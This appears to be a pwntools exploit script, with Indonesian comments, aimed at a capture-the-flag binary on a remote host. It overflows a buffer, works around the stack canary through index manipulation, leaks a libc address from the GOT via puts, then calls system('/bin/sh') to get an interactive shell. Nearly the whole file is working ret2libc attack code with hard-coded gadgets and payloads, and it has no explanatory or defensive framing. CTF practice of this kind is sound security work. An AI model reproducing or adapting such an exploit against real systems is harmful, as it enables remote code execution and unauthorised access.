from pwn import *

# Konfigurasi
elf = ELF('./main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('chall1.lagncra.sh', 17001)

# Alamat dari r2 kamu
pop_rdi = 0x0040118d
ret = 0x0040118e
start_addr = 0x401090
puts_plt = 0x401030
read_got = 0x404020 # Berdasarkan r2 -qc "ir~read"

log.info(f"Using read@GOT: {hex(read_got)}")

# --- STAGE 1: LEAK ---
a_idx = 5  # Index Canary di stack frame main (0x28 / 8)
b_idx = 25 # Coba 24 atau 26 jika ini gagal

payload = b"A" * 40
payload += b"FIXCANAR" 
payload += b"B" * 8     
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(start_addr)

log.info("Sending Stage 1...")
p.sendafter(b"read > ", payload)
p.sendlineafter(b"idx of destination > ", str(a_idx).encode())
p.sendlineafter(b"idx of source > ", str(b_idx).encode())

try:
    p.recvuntil(b"did it!\n")
    leak = u64(p.recv(6).ljust(8, b"\x00"))
    libc.address = leak - libc.sym['read']
    
    if (libc.address & 0xfff) != 0:
        log.error("Leak meleset (bukan akhiran 000).")
    else:
        log.success(f"Libc Base: {hex(libc.address)}")
except EOFError:
    log.error("CRASH! Index 'b' salah atau sinkronisasi gagal.")
    p.close()
    exit()

# --- STAGE 2: SHELL ---
p.recvuntil(b"read > ")
payload2 = b"A" * 40
payload2 += b"FIXCANAR"
payload2 += b"B" * 8
payload2 += p64(ret) 
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b"/bin/sh")))
payload2 += p64(libc.sym['system'])

p.send(payload2)
p.sendlineafter(b"destination > ", str(a_idx).encode())
p.sendlineafter(b"source > ", str(b_idx).encode())

log.success("SHELL GRANTED!")
p.interactive()
